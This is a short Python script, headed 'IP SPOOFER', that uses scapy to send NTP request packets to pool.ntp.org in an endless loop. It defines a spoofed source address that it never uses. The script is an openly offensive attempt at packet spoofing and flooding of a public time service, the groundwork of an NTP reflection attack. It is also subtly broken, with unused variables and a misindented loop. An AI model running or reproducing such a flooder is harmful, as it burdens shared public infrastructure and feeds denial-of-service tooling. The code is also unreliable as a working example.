import socket
import struct
import datetime
from scapy.all import *
import threading
import os
import sys
import socket

# IP SPOOFER
A = "127.0.0.1" # spoofed source IP address
B = "pool.ntp.org" # destination IP address
C = RandShort() # source port
D = 80 # destination port
payload = "yada yada yada" # packet payload

 while True:
    spoofed_packet = IP(dst=B) / UDP(dport=123,sport=50000) / ("\x1b\x00\x00\x00"+"\x00"*11*4)
    #sniff(prn=lambda x:x.summary(), count=5)
    send(spoofed_packet)
# rep,non_rep = sr(spoofed_packet)



